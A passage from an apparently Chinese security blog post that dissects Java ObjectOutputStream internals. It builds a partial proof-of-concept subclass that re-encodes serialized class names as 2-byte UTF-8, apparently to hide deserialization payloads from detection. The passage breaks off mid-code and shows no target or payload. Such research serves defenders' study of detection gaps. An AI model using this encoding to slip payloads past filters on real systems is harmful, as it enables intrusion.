</span></span></span></code></pre></div><h3 id="poc构造">poc构造<a hidden class="anchor" aria-hidden="true" href="#poc构造">#</a></h3>
<p>其实我们最大的问题就是不能直接重写<code>writeUTFBody</code>方法（这里的时候还不会agent！_!），因为他是<code>private</code>且是<code>ObjectOutputStream</code>的子类</p>
<p>我们看到<code>writeUTFBody</code> if会判断范围然后进行对应byte的编码，然后注意下这里数据少（&lt;1024）的时候不会执行下方else中<code>write()</code>方法，哪里会进行写入呢，我们根据调用栈往上查找</p>
<p><img loading="lazy" src="../images/image-20241216163232428.png" alt="image-20241216163232428"  />
</p>
<p>见下图，<code>writeClassDescriptor(desc);</code>就是上面执行<code>写入buf</code>的操作。而<code>bout.setBlockDataMode(true);</code>里的<code>drain()</code>函数才是真正写入数据的时候</p>
<p><img loading="lazy" src="../images/image-20241216163442044.png" alt="image-20241216163442044"  />
</p>
<h4 id="drain">drain()<a hidden class="anchor" aria-hidden="true" href="#drain">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">void</span><span class="w"> </span><span class="nf">drain</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">blkmode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeBlockHeader</span><span class="p">(</span><span class="n">pos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">pos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>这里<code>out.write</code>才是真正进行写入操作的地方。</p>
<h4 id="buf">buf<a hidden class="anchor" aria-hidden="true" href="#buf">#</a></h4>
<p>还记得我们的问题么，不能直接重写writeUTFBody方法，那能不能设置这个buf值呢？</p>
<p>反射？其实不行，因为我们要在执行drain()前一刻覆盖这个值，过早会被<code>writeUTFBody</code>会被覆盖，过晚也不行。</p>
<blockquote>
<p>但是天无绝人之路！！我们回想到<code>writeUTFBody</code>中下面一个else里不是有write操作么？这个是什么逻辑呢</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">limit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">2</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="c1">// write one byte at a time to normalize block</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>我们可以看到超过limit会进入到这个else，<code>limit</code>是1204-3，我们看看write干了啥</p>
<p><img loading="lazy" src="../images/image-20241216165006151.png" alt="image-20241216165006151"  />
</p>
<p>可以看到当pos超过<code>MAX_BLOCK_SIZE</code>执行了<code>drain()</code>,就是进行写入，然后pos归0，然后会把<code>(byte) b</code>记录到<code>BlockDataOutputStream.buf</code>中这里不就<strong>可以设置buf变量的值</strong>了么，但是这个是<code>BlockDataOutputStream</code>类的方法，我们也调不了呀</p>
<p>但是<code>ObjectOutputStream</code>也有个<code>write</code>可以帮我们调用<code>BlockDataOutputStream</code>的write了hhh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">write</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">bout</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">val</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>那我们可以直接通过<code>ObjectOutputStream.write</code>来将我们要写入的值记录到<code>BlockDataOutputStream.buf</code>中，然后<code>drain()</code>的时候进行写入。</p>
<blockquote>
<p>心理路程，挺乱的可以不看</p>
<p>不能直接重写<code>writeUTFBody</code>，但是我们可以重写<code>writeUTF</code>他是<code>ObjectOutputStream</code>方法且是<code>public</code>，然后把<code>writeUTF</code>中需要吊用的方法都可以重新构造成我们的方法（getUTFLength，writeUTFBody）//最开始我以为是重写了后面发现其实不是，刚开始我以为就修改下范围就搞定了，发现其实不是这么事，最初的poc（就是下面poc1把注释取消的代码）<strong>并没有进行类名的写入</strong>，继续调试了下代码发现<code>writeBytes</code>和<code>writeUTFBody</code>中其实并不会执行真正的<code>write操作</code>，只是把值记录到<code>BlockDataOutputStream.buf</code>变量中，而我poc的类也只是记录到<code>MyObjectOutputStream.buf</code>,而不是<code>BlockDataOutputStream中的buf</code>这也是执行<code>drain()</code>的时候，其实buf里没有值hhh，所以没有写入</p>
</blockquote>
<h3 id="poc1">poc1<a hidden class="anchor" aria-hidden="true" href="#poc1">#</a></h3>
<p>这里我把2处<code>小于7F</code>的范围改成，<code>c &lt;= 0x0020 &amp;&amp; c != 0</code>，20对应的是32，空白符就1byte的格式，大于32的就采用<code>2byte</code>，实现我们的加密。</p>
<p>poc中只有<code>writeUTF(String s)</code>是重写，其他都是我们自己构建的这些方法，因为父类没有这些方法，而<code>writeUTF(String s, long utflen)</code>是因为包的原因其实也不是重写。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">UTF8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.OutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.UTFDataFormatException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyObjectOutputStream</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">MAX_BLOCK_SIZE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1024</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/** maximum data block header length */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">cbuf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">char</span><span class="o">[</span><span class="n">CHAR_BUF_SIZE</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/** (tunable) length of char buffer (for writing strings) */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">256</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="n">MAX_BLOCK_SIZE</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyObjectOutputStream</span><span class="p">(</span><span class="n">OutputStream</span><span class="w"> </span><span class="n">out</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">out</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeUTF</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">getUTFLength</span><span class="p">(</span><span class="n">s</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0xFFFFL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeShort</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">writeBytes</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">writeUTFBody</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTFBody</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_BLOCK_SIZE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                if (pos &lt;= limit) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    if (c &lt;= 0x0020 &amp;&amp; c != 0) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos++] = (byte) c;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    } else if (c &gt; 0x07FF) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 2] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 6) &amp; 0x3F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 0] = (byte) (0xE0 | ((c &gt;&gt; 12) &amp; 0x0F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        pos += 3;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    } else {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        buf[pos + 0] = (byte) (0xC0 | ((c &gt;&gt; 6) &amp; 0x1F));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        pos += 2;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                } else {    // write one byte at a time to normalize block</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x0020</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
